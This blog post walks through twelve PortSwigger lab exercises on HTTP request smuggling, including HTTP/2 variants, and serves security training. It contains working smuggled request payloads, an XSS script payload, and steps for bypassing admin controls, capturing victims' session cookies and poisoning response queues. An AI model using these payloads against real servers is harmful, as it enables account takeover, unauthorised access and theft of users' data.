---
layout: default
title: "Mastering HTTP Request Smuggling: A Deep Dive into PortSwigger Labs (Part 2)"
date: 2025-12-10
categories: [Web Security, HTTP]
toc: true
---

# 🧠 Understanding Request Smuggling Vulnerabilities



HTTP Request Smuggling arises when the Front-End and Back-End servers disagree on the boundaries of a request. By exploiting this desynchronization, an attacker can smuggle a malicious request inside a benign one, leading to security bypasses, data theft, and cache poisoning.

This guide breaks down **twelve** distinct exploitation scenarios found in the PortSwigger Web Security Academy, ranging from basic CL.TE desyncs to advanced HTTP/2 Request Splitting.

---

## 🧪 LAB 1: Basic CL.TE Vulnerability

### 🧐 How the Vulnerability Exists
The Front-End uses the `Content-Length` header, while the Back-End prioritizes `Transfer-Encoding: chunked`.

**Root Cause:** The Back-End stops processing when it sees the `0` chunk, ignoring the `Content-Length` header that the Front-End obeyed. This leaves the remaining data (`GPOST...`) in the TCP buffer.

### 🚨 Exploitation Steps

1.  **Configure Repeater:**
    Uncheck **"Update Content-Length"** in the Repeater menu. You must define this header manually.

2.  **Construct Payload:**
    **Headers:** `Content-Length: 6` (or appropriate length), `Transfer-Encoding: chunked`.
    **Body:** A `0` chunk followed by the poisoned request prefix.
    ```
    POST / HTTP/1.1
    Host: ...
    Content-Length: 6
    Transfer-Encoding: chunked

    0

    GPOST / HTTP/1.1
    Foo: x
    ```
    ![image](/images/Pasted%20image%2020251209115523.png)

3.  **Execute:**
    Send the request once to poison the socket.
    Send a normal request immediately after.
    **Result:** The Back-End combines the waiting `GPOST` line with your new request, triggering an "Unrecognized method GPOST" error.

---

## 🧪 LAB 2: Basic TE.CL Vulnerability

### 🧐 How the Vulnerability Exists
The Front-End uses `Transfer-Encoding: chunked`, while the Back-End prioritizes `Content-Length`.

**Root Cause:** The Back-End trusts the `Content-Length` header (set to a small number like 4) and stops reading early, even though the Front-End forwarded a larger chunked body.

### 🚨 Exploitation Steps

1.  **Configure Repeater:**
    Uncheck **"Update Content-Length"**.

2.  **Construct Payload:**
    **Headers:** `Content-Length: 4`, `Transfer-Encoding: chunked`.
    **Body:** The chunk size (`5c`) tells the Front-End to read the whole block. The `CL: 4` tells the Back-End to stop after `5c\r\n`.
    ```
    POST / HTTP/1.1
    Host: ...
    Content-Length: 4
    Transfer-Encoding: chunked

    5c
    GPOST / HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15

    x=1
    0
    ```
    ![image](/images/Pasted%20image%2020251209120500.png)

3.  **Execute:**
    Send once to poison. Send again to trigger.
    **Result:** The Back-End reads `GPOST...` as the start of the next request.

---

## 🧪 LAB 3: Obfuscating the TE Header (TE.TE)

### 🧐 How the Vulnerability Exists
Both servers support `Transfer-Encoding`, but the Back-End can be tricked into ignoring it via obfuscation, forcing it to fall back to `Content-Length`.

**Root Cause:** Parser differential. The Front-End sees the valid `chunked` header, but the Back-End rejects the obfuscated one (e.g., `Transfer-encoding: cow`).

### 🚨 Exploitation Steps

1.  **Obfuscate:**
    Use `Transfer-encoding: cow` or `Transfer-Encoding : chunked`.

2.  **Construct Payload:**
    ```
    POST / HTTP/1.1
    Host: ...
    Content-Length: 4
    Transfer-Encoding: chunked
    Transfer-encoding: cow

    5c
    GPOST / HTTP/1.1
    ...
    0
    ```
    ![image](/images/Pasted%20image%2020251209123239.png)

3.  **Execute:**
    The Front-End treats it as chunked. The Back-End (confused by `cow`) treats it as CL (length 4).
    **Result:** TE.CL desync achieved.

    ![image](/images/Pasted%20image%2020251209123308.png)

---

## 🧪 LAB 4: Bypassing Front-End Security Controls (CL.TE)

### 🧐 How the Vulnerability Exists
The Front-End blocks access to `/admin`. However, the Back-End processes requests sent over the connection, including smuggled data which forms a *new* request to `/admin` that the Front-End never inspected.

**Root Cause:** Security controls are only applied to the outer request.

### 🚨 Exploitation Steps

1.  **Smuggle Admin Request:**
    Construct a CL.TE request where the smuggled part is `GET /admin`.
    **Crucial:** Include `Host: localhost` in the smuggled request to bypass "local users only" checks.
    ```
    POST / HTTP/1.1
    ...
    Content-Length: 116
    Transfer-Encoding: chunked

    0

    GET /admin HTTP/1.1
    Host: localhost
    Content-Length: 10

    x=
    ```
    ![image](/images/Pasted%20image%2020251208131806.png)

2.  **Solve:**
    Send twice. The second response will contain the Admin panel.
    Modify the smuggled request to `/admin/delete?username=carlos` to solve.

    ![image](/images/Pasted%20image%2020251208131841.png)

---

## 🧪 LAB 5: Bypassing Front-End Security Controls (TE.CL)

### 🧐 How the Vulnerability Exists
Similar to Lab 4, but using the TE.CL vector. The Front-End forwards the full chunked body, but the Back-End stops reading early, processing the hidden `/admin` request as the next request.

**Root Cause:** Incomplete inspection of chunked bodies.

### 🚨 Exploitation Steps

1.  **Calculate Chunk Size:**
    You must precisely calculate the hex size of the smuggled request.
    ```
    POST / HTTP/1.1
    Content-Length: 4
    Transfer-Encoding: chunked

    87
    GET /admin/delete?username=carlos HTTP/1.1
    Host: localhost
    Content-Length: 15

    x=1
    0
    ```
    ![image](/images/Pasted%20image%2020251208133805.png)

2.  **Execute:**
    Send the request. The Back-End executes the delete command.

    ![image](/images/Pasted%20image%2020251208133815.png)

---

## 🧪 LAB 6: Revealing Front-End Request Rewriting

### 🧐 How the Vulnerability Exists
The Front-End adds trusted headers (like `X-Forwarded-For`) to requests before sending them to the Back-End. We need these headers to bypass IP restrictions.

**Root Cause:** The application reflects the "search term" back to the user. By smuggling a request to the search endpoint, the Front-End will append the internal headers to our `search=` parameter.

### 🚨 Exploitation Steps

1.  **Smuggle the Search:**
    Smuggle a `POST` request to the search endpoint. Ensure the `Content-Length` of the smuggled request is large enough to "swallow" the headers of the next request.
    ```
    POST / HTTP/1.1
    ...
    0

    POST / HTTP/1.1
    Content-Length: 200

    search=
    ```
    ![image](/images/Pasted%20image%2020251208141633.png)

2.  **Leak Headers:**
    Send the request. The response to the *next* request will reflect the search term, which now contains the internal headers (e.g., `X-Abcdef-Ip: 1.2.3.4`).

    ![image](/images/Pasted%20image%2020251208141646.png)

3.  **Exploit:**
    Use the discovered header to spoof your IP and access `/admin`.

---

## 🧪 LAB 7: Capturing Other Users' Requests

### 🧐 How the Vulnerability Exists
A "Comment" functionality exists where the `comment` parameter is the last parameter in the body.

**Root Cause:** By smuggling a request with an open `comment=` parameter and a large `Content-Length`, the Back-End treats the *entirety* of the victim's request (headers + cookies) as the *content* of the comment.

### 🚨 Exploitation Steps

1.  **Construct the Trap:**
    Smuggle a comment request.
    ```
    POST / HTTP/1.1
    ...
    0

    POST /post/comment HTTP/1.1
    ...
    Content-Length: 400

    csrf=...&comment=
    ```
    ![image](/images/Pasted%20image%2020251208155755.png)

2.  **Wait for Victim:**
    Send the request. Wait for a user to visit.
    Check the blog post. You will see a comment containing the victim's **Session Cookie**.

    ![image](/images/Pasted%20image%2020251208152705.png)

3.  **Solve:**
    Hijack the session using the stolen cookie.

---

## 🧪 LAB 8: Delivering Reflected XSS via Smuggling

### 🧐 How the Vulnerability Exists
The application reflects the `User-Agent` header. Normally, this is self-XSS. However, using smuggling, we can force the *victim's* request to be processed with *our* malicious header.

**Root Cause:** Context Escalation. Smuggling turns reflected XSS into a "mass" attack vector.

### 🚨 Exploitation Steps

1.  **Construct Payload:**
    Smuggle a request that targets the vulnerable endpoint and includes the XSS payload in the `User-Agent`.
    ```
    GET /post?postId=... HTTP/1.1
    User-Agent: "><script>alert(1)</script>
    ```
    ![image](/images/Pasted%20image%2020251209185702.png)

2.  **Solve:**
    Send the request. The next user's request triggers this smuggled request, and the server reflects the script back to *them*.

---

## 🧪 LAB 9: Response Queue Poisoning (H2.TE)

### 🧐 How the Vulnerability Exists
The Front-End speaks HTTP/2, but the Back-End downgrades to HTTP/1.1. By injecting `Transfer-Encoding: chunked` into the H2 request, we cause the Back-End to see **two** requests while the Front-End sees **one**.

**Root Cause:** Queue Desync. The Front-End matches Response 1 to you and leaves Response 2 (the victim's response) in the queue for the next user.

### 🚨 Exploitation Steps

1.  **The "Fishing" Payload:**
    Smuggle a complete request.
    ```
    :method: POST
    transfer-encoding: chunked

    0

    GET /x HTTP/1.1
    Host: ...
    ```
    ![image](/images/Pasted%20image%2020251209162335.png)

2.  **Capture:**
    Send the attack. Wait. Send a normal request.
    If you get a **404**, you caught your own ghost.
    If you get a **302**, you caught the Admin's login response. Steal the cookie from the `Set-Cookie` header.

    ![image](/images/Pasted%20image%2020251209162313.png)

---

## 🧪 LAB 10: H2.CL Request Smuggling

### 🧐 How the Vulnerability Exists
Front-End (H2) determines length via frames. Back-End (H1) respects the injected `content-length` header.

**Root Cause:** Downgrade Attack. Injecting `content-length: 0` causes the Back-End to stop reading early, treating the body as the next request.

### 🚨 Exploitation Steps

1.  **Inject Header:**
    In the H2 request, add `content-length: 0`.
    Put the smuggled request in the body.
    ```
    :method: POST
    content-length: 0

    SMUGGLED
    ```
    ![image](/images/Pasted%20image%2020251209125358.png)

2.  **Solve:**
    Smuggle a request that redirects the victim to your exploit server to execute JavaScript.

    ![image](/images/Pasted%20image%2020251209130615.png)

---

## 🧪 LAB 11: HTTP/2 Smuggling via CRLF Injection

### 🧐 How the Vulnerability Exists
You cannot inject `transfer-encoding` directly. However, the Front-End allows CRLF (`\r\n`) in header *values*.

**Root Cause:** Downgrade Flaw. The Back-End interprets the injected `\r\n` as a delimiter, creating a new `Transfer-Encoding` header that wasn't there before.

### 🚨 Exploitation Steps

1.  **Inject CRLF:**
    Add a header `foo` with value `bar\r\nTransfer-Encoding: chunked`.
2.  **Smuggle:**
    The Back-End now treats the request as chunked. Proceed with a standard CL.TE attack to capture the victim's session.

    ![image](/images/Pasted%20image%2020251209140532.png)

---

## 🧪 LAB 12: HTTP/2 Request Splitting via CRLF

### 🧐 How the Vulnerability Exists
You inject `\r\n\r\n` into a header value.

**Root Cause:** This terminates the HTTP/1.1 request headers immediately and starts a *new* request within the same H2 frame. The Back-End sees 2 requests; the Front-End sees 1.

### 🚨 Exploitation Steps

1.  **Inject Split:**
    Header `foo` value: `bar\r\n\r\nGET /admin HTTP/1.1\r\n...`
    ![image](/images/Pasted%20image%2020251209180201.png)

2.  **Capture:**
    The Back-End sends two responses. You get the first. The second (Admin response) waits in the queue. Send a follow-up request to catch it.

    ![image](/images/Pasted%20image%2020251209180213.png)

---

## ⚡ Fast Triage Cheat Sheet

| Attack Vector | 🚩 Immediate Signal | 🔧 The Critical Move |
| :--- | :--- | :--- |
| **CL.TE** | Timeout on short CL/long body. | Uncheck "Update Content-Length". |
| **TE.CL** | Timeout on chunked body/short CL. | Set `Content-Length: 4`. |
| **TE.TE** | Obfuscated TE accepted. | `Transfer-encoding: cow`. |
| **Admin Bypass** | 403 on `/admin`. | Smuggle `GET /admin` with `Host: localhost`. |
| **Capture User** | `comment` param at end. | Smuggle with `Content-Length: 400`. |
| **H2.TE Queue** | 404s on every 2nd request. | "Fish" for 302 Admin redirect. |
| **H2 Splitting** | Header CRLF injection. | Inject `\r\n\r\n` to split request. |
